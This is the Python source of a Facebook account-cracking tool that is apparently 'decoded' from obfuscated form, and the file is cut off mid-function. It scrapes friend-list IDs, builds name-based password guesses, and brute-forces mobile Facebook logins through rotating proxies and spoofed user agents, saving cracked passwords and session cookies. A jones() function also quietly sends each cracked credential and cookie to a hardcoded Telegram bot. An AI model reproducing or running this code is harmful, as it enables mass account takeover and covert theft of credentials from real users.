#Decoded By HARRY-EXE on Github :)

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
import os, platform, time, sys
import socket 

  
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#------------------[ GLOBAL VARIABLES ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

#-----------------------[ API ]--------------------#
 
def jones(idf,pw,kuki):
    try:
        token = "7090613267:AAEjFBlsVzYgrAnZ2s4KCRyDM5s2wPMglF8"
        chatid = "5918006267"
        ok_id =str(idf+"|"+pw+"|"+kuki)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
#------------------[ PROXY ]-------------------#

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()


#------------------[ USER-AGENT ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
user=[]
logincookie=[]

#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';P = '\033[1;36m';O = '\033[1;35m'

#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def contact():
	os.system('xdg-open https://facebook.com/profile.php?id=100080987563928&mibextid=ZbWKwL/')
	back()
def linex():
	print("""\033[1;32m=====================\033[1;37m=====================""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]    

#------------------[ LOGO-LAKNAT ]-----------------#
logo=("""\033[1;32m  	
  \033[1;32m___ ___         __    __           
\033[1;32m /   |   \_____  |  | _|  | ____ __  
\033[1;37m/    ~    \__  \ |  |/ /  |/ /  |  \ 
\033[1;37m\    Y    // __ \|    <|    <|  |  / 
\033[1;32m \___|_  /(____  /__|_ \__|_ \____/  
\033[1;32m       \/      \/     \/    \/ """)    

      
def info():         
    print("""\033[1;32m=====================\033[1;37m=====================
• DEVLOPER : \033[1;37mJONES-\033[1;32mHAKKU\033[1;37m
• Version  :\033[1;32m 1.0 \033[1;32m \033[1;37m
\033[1;32m=====================\033[1;37m=====================""")

def banner():
	print(logo)

#--------------------[ LOGIN ]--------------#

def login123():
	os.system('clear')
	banner()
	info()
    
	print("""\x1b[38;5;46m[\x1b[1;97m1\x1b[38;5;46m]\x1b[1;97m LOGIN USING COOKIE""")
	print("""\x1b[38;5;46m[\x1b[1;97m2\x1b[38;5;46m]\x1b[1;97m FILE CLONE""")
	print("""\x1b[38;5;46m[\x1b[1;97m3\x1b[38;5;46m]\x1b[1;97m CONTACT ADMIN""")
	print("""\x1b[38;5;46m[\x1b[1;97m0\x1b[38;5;46m]\x1b[1;97m EXIT TOOL """)
	linex()
	lgmt = input('CHOOSE : ')
	if lgmt == '1':
		login_lagi334()
	elif lgmt == '2':
		crack_file()
	elif lgmt == '3':
		contact()
	
	else:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
		restart()
def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f'[\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()
         
#---------------------[COOKIE && LOGIN]----------------------#
         
def login_lagi334():
	try:
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		print(logo)
		linex()
		cookie=input(f'\033[1;37m[\033[1;32m>>\033[1;37m] \033[1;37mCOOKIE :{asu} ')
		open("data/.cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open("data/.token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('[\033[1;31mx\033[1;37m]FUCK'%(p))

			except:
				linex()
				print('\033[1;37m[\033[1;31m×\033[1;37m] FUCK')

		print(f'\033[1;37m[\033[1;32m>\033[1;37m] \033[1;32mRUN AGAIN ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f data/.token.txt")
		os.system("rm -f data/.cok.txt")
		print(f'  %s[%sx%s]%s COOKIE EXPIRED....PLEASE INPUT FRESH COOKIE!!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass

		
#------------------[ MENU ]----------------#

def menu(my_name,my_id):
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	info()
	print("[\u001b[32m•\033[1;37m] TODAYS DATE : "+date)
	linex()
	print(f"""[\u001b[32m1\033[1;37m] CRACK PUBLIC       """)
	print(f"""[\u001b[32m2\033[1;37m] CRACK FILE        """)
	print(f"""[\u001b[32m3\033[1;37m] CHECK RESULTS      """)
	print(f"""[\u001b[32m4\033[1;37m] CONTACT ADMIN""")
	print(f"""[\u001b[32m5\033[1;37m] EXIT TOOL""")
	linex()
	_____cowok__pink_____ = input(' CHOOSE : ')
	if _____cowok__pink_____ in ['1']:
		dump_massal()
	elif _____cowok__pink_____ in ['2']:
		crack_file()
	elif _____cowok__pink_____ in ['3','03']:
		result()
	
	elif _____cowok__pink_____ in ['4','04']:
		contact()
	
	elif _____cowok__pink_____ in ['0']:
		os.system('rm -rf data/.token.txt')
		os.system('rm -rf .cookie.txt')
		linex()
		animation('[✓] DONE LOGOUT ')
		exit()
	else:
		linex()
		animation('[×] SELECT CORRECTLY ')
		back()

	#-----------------[ HASIL-CRACK ]-----------------#

def result():
	linex()
	os.system('clear')
	banner()
	linex()
	print('\033[1;37m[\u001b[32m1\033[1;37m] CHECK CP IDZ ')
	print('[\u001b[32m2\033[1;37m] CHECK OK IDZ ')
	print('[\u001b[32m0\033[1;37m] EXIT ')
	linex()
	kz = input('[\u001b[32m•\033[1;37m] CHOOSE : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[32m×\033[1;37m] FILE NOT FOUND ')
			time.sleep(3)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[32m•\033[1;37m] NO CP RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					linex()
					print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
			linex()
			geeh = input(' [\u001b[32m•\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[32m×\033[1;37m] NO OPTION FOUND ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				linex()
				animation(' [\u001b[32m×\033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[32m•\033[1;37m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> PRESS ENTER TO BACK ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[32m×\033[1;37m] FILE NOT FOUND ')
			time.sleep(2)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[32m•\033[1;37m] NO OK RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					linex()
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
			linex()
			geeh = input(' [\u001b[32m•\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[32m×\033[1;37m] NO OPTION FOUND ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				linex()
				animation(' [\u001b[32m×\033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[32m•\033[1;37m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> PRESS ENTER TO BACK ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		linex()
		animation(' [\u001b[32m×\033[1;37m] NO OPTION FOUND IN MENU')
		exit()

#-------------------[ CRACK-PUBLIK ]----------------#

def dump_massal():
    try:
        token = open('data/.token.txt','r').read()
        cok = open('data/.cok.txt','r').read()
    except IOError:
        print(f'{m}INVALID COOKIE')
        exit()
    try:
    	print('')
    	dwi = int(input(f"[\u001b[32m>>\033[1;37m] ENTER TARGET AMOUNT  : "))
    except ValueError:
        exit()
    if dwi < 1 or dwi > 1000:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input(f'[\u001b[32m>>\033[1;37m] INPUT UID '+str(_dwi_)+' : ')
        uid.append(Masukan)
    for user in uid:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            url = requests.get('https://graph.facebook.com/{}'.format(user),
                               params=params, headers=head, cookies={'cookies': cok}).json()
            for proses in url['friends']['data']:
                try:
                    woy = (proses['id']+'|'+proses['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:       
              linex()     
        os.system('clear')
    try:
    	
    	banner()
    	info()
    	
    	print(f'\x1b[37m[\x1b[32m>>\x1b[37m]\x1b[37m TOTAL ID : \x1b[38;5;196m'+str(len(id))+'\x1b[37m')
    	setting()
    except requests.exceptions.ConnectionError:
    	print(f'{u}')
    	back()
    except (KeyError,IOError):
    	linex()
    	animation(" [×] DUMP ID FAILED ")
    	time.sleep(3)
    	back()

#-------------[ CRACK-FROM-FILE ]------------------#

def crack_file():
	linex()
	o = input('[\u001b[32m>>\033[1;37m] FILE NAME : ')
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [×] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()




#-------------[ PENGATURAN-IDZ ]---------------#

def setting():
	linex()
	print("[\u001b[32m1\033[1;37m] OLD IDZ")
	print("[\u001b[32m2\033[1;37m] NEW IDZ")
	print("[\u001b[32m3\033[1;37m] MIX IDZ")
	linex()
	hu = input('[\u001b[32m•\033[1;37m] CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	print("[\u001b[32m>>\033[1;37m] LOGIN METHOD ")
	linex()
	print("[\u001b[32m1\033[1;37m] METHOD 1")
	print("[\u001b[32m2\033[1;37m] METHOD 2")
	linex()
	hc = input('[\u001b[32m>>\033[1;37m] CHOOSE : ')
	if hc in ['1','01']:
		method.append('mobile')
#	elif hc in ['2','02']:
#		method.append('p')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('free')
	else:
		method.append('mobile')
	passwrd()
	exit() 	
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
    os.system('clear')
    print(logo)    
    print(f' Total accounts :\033[1;32m',str(len(id)))
    linex()
    print("\033[1;37m USE AIRPLANE MODE FOR MORE OK IDS\033[1;32m")
    linex()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'321@')                 
                    pwv.append(frs+'12345')
                    pwv.append(nmf)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')                    
                    pwv.append(frs+'12345@') 
                    pwv.append(frs+'321')
                    pwv.append(frs+'123@')                    
                    pwv.append(frs+'54321')
                    pwv.append(frs+'@321') 
                    pwv.append(frs+'54321@')  
                    pwv.append(frs+'@12345')                 
                    pwv.append(nmf+'123')
                    pwv.append(nmf+'@123')         
                                            
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:                    
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'321@')                 
                    pwv.append(frs+'12345')
                    pwv.append(nmf)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')                 
                    pwv.append(frs+'12345@') 
                    pwv.append(frs+'321')
                    pwv.append(frs+'123@')                    
                    pwv.append(frs+'54321')
                    pwv.append(frs+'@321') 
                    pwv.append(frs+'54321@')  
                    pwv.append(frs+'@12345')                 
                    pwv.append(nmf+'123')
                    pwv.append(nmf+'@123')         
                    
                                                    
            pool.submit(crack,idf,pwv)
                
    linex()
    print(' The process has completed')
    print(f' Total OK/CP: {ok}/{cp}')
    linex()
    woi = input(' Press enter to back ')
    back()
#--------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \u001b[37m[JONES-HAKKU] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ne-US;q=0.8,ne;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'referer': 'https://m.facebook.com/?wtsid=rdr_0Ozq3X6Lw0K6GN1bM',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua2,
    'viewport-width': '980',
}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [HAKKU-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/JONES-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				jones(idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}HAKKU-CP{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/JONES-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \u001b[37m[JONES-HAKKU] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"m.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"www.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
